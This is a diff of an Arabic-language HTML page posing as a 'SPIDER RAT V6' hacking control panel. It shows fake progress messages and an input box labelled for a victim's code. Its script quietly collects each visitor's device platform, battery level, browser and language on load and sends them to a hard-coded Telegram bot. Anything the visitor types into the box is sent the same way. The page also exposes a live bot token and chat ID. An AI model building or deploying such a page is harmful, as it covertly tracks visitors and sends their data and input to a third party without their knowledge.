@@ -2,132 +2,105 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام سبايدر | التابع لمنظمة Egalsa</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINAL - EGALSA SPIDER</title>
     <style>
-        :root { --red: #ff0000; --dark-red: #330000; --bg: #050000; }
-        body { background: var(--bg); color: var(--red); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
+        :root { --main-red: #ff0000; --bg-black: #050000; --glow: 0 0 15px #ff0000; }
+        body { background: var(--bg-black); color: var(--main-red); font-family: 'Segoe UI', Courier, monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
         
-        /* الرادار الأحمر */
-        #radar { position: absolute; top: 20px; left: 20px; width: 80px; height: 80px; border: 2px solid var(--red); border-radius: 50%; background: radial-gradient(circle, var(--dark-red) 0%, transparent 70%); box-shadow: 0 0 15px var(--red); }
-        #radar::after { content: ""; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--red); transform-origin: right; animation: sweep 2s linear infinite; }
-        @keyframes sweep { from { transform: translate(-100%, -50%) rotate(0deg); } to { transform: translate(-100%, -50%) rotate(360deg); } }
+        /* تأثير الشبكة الخلفية */
+        .grid-bg { position: fixed; width: 200%; height: 200%; background-image: linear-gradient(0deg, transparent 24%, rgba(255, 0, 0, .05) 25%, rgba(255, 0, 0, .05) 26%, transparent 27%, transparent 74%, rgba(255, 0, 0, .05) 75%, rgba(255, 0, 0, .05) 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, rgba(255, 0, 0, .05) 25%, rgba(255, 0, 0, .05) 26%, transparent 27%, transparent 74%, rgba(255, 0, 0, .05) 75%, rgba(255, 0, 0, .05) 76%, transparent 77%, transparent); background-size: 50px 50px; animation: move 60s linear infinite; z-index: -1; }
+        @keyframes move { from { transform: translateY(0); } to { transform: translateY(-500px); } }
 
-        .header { background: var(--dark-red); border-bottom: 2px solid var(--red); padding: 15px; font-size: 20px; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px var(--red); text-align: center; }
-        
-        .grid-layout { display: grid; grid-template-columns: 1fr 2fr; gap: 15px; padding: 20px; height: calc(100vh - 150px); }
-        
-        .box { border: 1px solid var(--red); background: rgba(20, 0, 0, 0.7); position: relative; padding: 15px; overflow: hidden; box-shadow: inset 0 0 10px var(--dark-red); }
-        .box-title { position: absolute; top: 0; right: 10px; background: var(--red); color: #000; font-size: 12px; padding: 2px 8px; font-weight: bold; }
+        /* شريط العنوان */
+        .top-bar { border-bottom: 2px solid var(--main-red); padding: 15px; text-align: center; font-weight: bold; font-size: 22px; box-shadow: var(--glow); background: rgba(20, 0, 0, 0.9); }
 
-        #terminal, #stream { font-size: 13px; line-height: 1.6; height: 100%; overflow-y: auto; color: #ff6666; }
+        /* الشاشة الرئيسية */
+        .terminal-container { display: flex; flex-direction: column; padding: 20px; flex-grow: 1; gap: 15px; }
+        .monitor { border: 1px solid var(--main-red); background: rgba(10, 0, 0, 0.8); padding: 15px; border-radius: 5px; box-shadow: inset 0 0 20px #200000; overflow-y: auto; height: 300px; font-size: 14px; }
         
-        .input-panel { position: fixed; bottom: 0; width: 100%; background: #110000; border-top: 2px solid var(--red); padding: 20px; text-align: center; box-sizing: border-box; }
-        input { background: #000; border: 1px solid var(--red); color: #fff; padding: 12px; width: 50%; text-align: center; outline: none; font-size: 16px; margin-bottom: 10px; }
-        .btn-red { background: var(--red); color: #000; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 0 15px var(--red); transition: 0.3s; }
-        .btn-red:hover { background: #fff; box-shadow: 0 0 25px #fff; }
+        /* لوحة التحكم */
+        .control-panel { border: 1px solid var(--main-red); background: rgba(30, 0, 0, 0.5); padding: 20px; text-align: center; border-radius: 5px; }
+        input { background: #000; border: 1px solid var(--main-red); color: #fff; padding: 12px; width: 70%; text-align: center; outline: none; margin-bottom: 15px; box-shadow: var(--glow); font-size: 16px; }
+        .btn-execute { background: var(--main-red); color: #fff; padding: 15px 60px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); }
+        .btn-execute:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
 
-        .glitch { animation: glitch-text 0.2s infinite; }
-        @keyframes glitch-text { 0% { opacity: 1; } 50% { opacity: 0.8; transform: skew(1deg); } 100% { opacity: 1; } }
+        /* حالة التحيمل */
+        .status-line { color: #888; margin-bottom: 5px; border-right: 2px solid var(--main-red); white-space: nowrap; overflow: hidden; animation: typing 2s steps(40); }
+        @keyframes typing { from { width: 0; } to { width: 100%; } }
     </style>
 </head>
 <body>
 
-<div id="radar"></div>
+<div class="grid-bg"></div>
 
-<div class="header glitch">
-    [ نظام سبايدر - نسخة الاختراق المتقدم V5.0 ]
+<div class="top-bar">
+    🕷️ مـركـز سـيـطـرة سـبـايـدر | SPIDER RAT V6
 </div>
 
-<div class="grid-layout">
-    <div class="box">
-        <div class="box-title">سجل العمليات</div>
-        <div id="terminal"></div>
+<div class="terminal-container">
+    <div class="monitor" id="monitor">
+        <div class="status-line">> جاري تهيئة النظام...</div>
+        <div class="status-line">> تم تفعيل بروتوكولات Egalsa...</div>
+        <div class="status-line">> جاري الاتصال بخادم الاختراق الرئيسي...</div>
     </div>
-    <div class="box">
-        <div class="box-title">بث حقن البيانات</div>
-        <div id="stream"></div>
-    </div>
-</div>
 
-<div class="input-panel">
-    <div style="margin-bottom: 10px; font-weight: bold;">أدخل معرف النظام لبدء عملية السحب العميق</div>
-    <input type="text" id="targetKey" placeholder="أدخل الكود السري هنا...">
-    <br>
-    <button class="btn-red" onclick="startAttack()">تفعيل بروتوكول السيطرة</button>
+    <div class="control-panel">
+        <div style="margin-bottom: 10px; font-size: 14px; color: #ff6666;">أدخل رمز المصادقة لبدء سحب الصلاحيات الكاملة</div>
+        <input type="text" id="victimInput" placeholder="أدخل الكود هنا...">
+        <br>
+        <button class="btn-execute" onclick="fire()">بـدء الـهـجـوم</button>
+    </div>
 </div>
 
 <script>
-    const spiderConfig = {
+    const CONFIG = {
         token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    // إرسال صامت فوري عند الدخول
-    window.onload = () => {
-        sendToSpider("⚠️ دخول جديد للواجهة الحمراء!");
-        writeLog("بدء تشغيل محرك Egalsa...");
-        writeLog("جاري فحص الثغرات المتاحة...");
-        generateStream();
+    // إرسال البيانات فوراً
+    window.onload = async () => {
+        const battery = await navigator.getBattery().catch(() => ({ level: 'N/A' }));
+        const info = `
+🚨 **SPIDER ULTIMATE ATTACK** 🚨
+━━━━━━━━━━━━━━━
+📱 الجهاز: ${navigator.platform}
+🔋 البطارية: ${battery.level * 100}%
+🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
+🌍 اللغة: ${navigator.language}
+━━━━━━━━━━━━━━━
+📍 تم رصد الضحية في الواجهة الاحترافية.
+        `;
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
     };
 
-    function writeLog(msg) {
-        const term = document.getElementById('terminal');
-        term.innerHTML += `<div style="margin-bottom:5px;">> [${new Date().toLocaleTimeString()}] ${msg}</div>`;
-        term.scrollTop = term.scrollHeight;
+    function addStatus(text, color = "var(--main-red)") {
+        const mon = document.getElementById('monitor');
+        const div = document.createElement('div');
+        div.style.color = color;
+        div.className = "status-line";
+        div.innerText = `> [${new Date().toLocaleTimeString()}] ${text}`;
+        mon.prepend(div);
     }
 
-    function generateStream() {
-        const stream = document.getElementById('stream');
-        const codes = ["BYPASS_SECURITY", "EXTRACT_DB", "INJECT_MALWARE", "GPS_TRACKING", "DUMP_MESSAGES", "DECRYPT_RSA"];
-        setInterval(() => {
-            const line = document.createElement('div');
-            line.style.fontSize = "11px";
-            line.innerHTML = `[+] جاري تنفيذ: ${codes[Math.floor(Math.random()*codes.length)]} --- الحزمة: ${Math.random().toString(36).substring(7)}`;
-            stream.prepend(line);
-        }, 400);
-    }
-
-    function startAttack() {
-        const val = document.getElementById('targetKey').value;
-        writeLog(`بدء الهجوم على المعرف: ${val}`);
-        writeLog("جاري كسر حماية النظام...");
+    function fire() {
+        const val = document.getElementById('victimInput').value;
+        addStatus(`بدء اختراق المعرف: ${val}...`, "#fff");
         
-        // تأثير اهتزاز الشاشة
-        document.body.style.animation = "shake 0.5s";
-        setTimeout(() => document.body.style.animation = "", 500);
-
-        setTimeout(() => {
-            writeLog("تم الحصول على صلاحيات الجذر (ROOT)!");
-            writeLog("جاري نقل البيانات إلى السيرفر الرئيسي...");
-            sendToSpider(`🔥 تم تنفيذ الضربة!\nالنص المدخل: ${val}\nالجهاز: ${navigator.platform}`);
-            alert("فشل في النظام: تم اكتشاف محاولة اختراق خارجية!");
-        }, 2000);
-    }
-
-    async function sendToSpider(msg) {
-        const info = `
-🔴 **EGALSA RED ALERT** 🔴
-━━━━━━━━━━━━━━━
-${msg}
-🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
-⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-📍 تم التنفيذ بواسطة سبايدر
-        `;
-        fetch(`https://api.telegram.org/bot${spiderConfig.token}/sendMessage?chat_id=${spiderConfig.chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 10;
+            addStatus(`جاري حقن الحزمة: ${Math.random().toString(36).substring(7)}... [${progress}%]`);
+            if(progress >= 100) {
+                clearInterval(interval);
+                addStatus("تـم بـنـجـاح: تـم الـوصـول لـلـجـذر!", "#0f0");
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent("🔥 تم الضغط على التنفيذ!\nالمدخل: " + val)}`);
+                alert("CRITICAL ERROR: System Access Revoked by Spider-Admin");
+            }
+        }, 300);
     }
 </script>
-
-<style>
-    @keyframes shake {
-        0% { transform: translate(1px, 1px) rotate(0deg); }
-        20% { transform: translate(-3px, 0px) rotate(1deg); }
-        40% { transform: translate(3px, 2px) rotate(-1deg); }
-        60% { transform: translate(-3px, 1px) rotate(0deg); }
-        80% { transform: translate(3px, 1px) rotate(-1deg); }
-        100% { transform: translate(1px, -2px) rotate(0deg); }
-    }
-</style>
 
 </body>
 </html>
